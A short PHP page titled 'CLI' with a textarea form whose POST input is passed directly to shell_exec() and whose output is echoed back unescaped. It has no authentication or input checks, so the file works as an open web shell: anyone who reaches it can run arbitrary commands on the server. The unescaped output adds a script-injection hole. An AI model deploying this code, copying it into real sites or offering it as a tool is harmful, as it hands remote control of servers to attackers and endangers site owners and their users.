<?php
session_start();


$inactive = 1800;

if(isset($_POST['input'])){
    $data = $_POST['input'];
    $shell = shell_exec($data);
    $_SESSION['cli'][] = array('info' => $shell);
}
if(isset($_SESSION['activity']) && (time() - $_SESSION['activity'] > $inactive)){
    session_unset();
    session_destroy();
}
$_SESSION['activity'] = time();

?>

<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/html">
<head>
    <meta charset="UTF-8">
    <title>CLI</title>
    <link rel="stylesheet" href="css/main.css">
</head>
<body>
<header>
    <h1>Version 1</h1>
</header>

<div id="inputarea">
    <h2>Input</h2>
    <form method="post" action="">
        <textarea id="input" name="input"></textarea>
        <input id="submit" type="submit" value="Submit">
    </form>
</div>


<div id="outputarea">
    <h2>Output</h2>
    <div id="output">
        <?php
        if(isset($_SESSION['cli'])){
            for($i = 0; $i < count($_SESSION['cli']); $i++ ){
                foreach($_SESSION['cli'][$i] as $out){
                    echo "<pre>";
                    echo $out;
                    echo "</pre>";
                }
            }
        }
        ?>
    </div>
</div>

</body>
</html>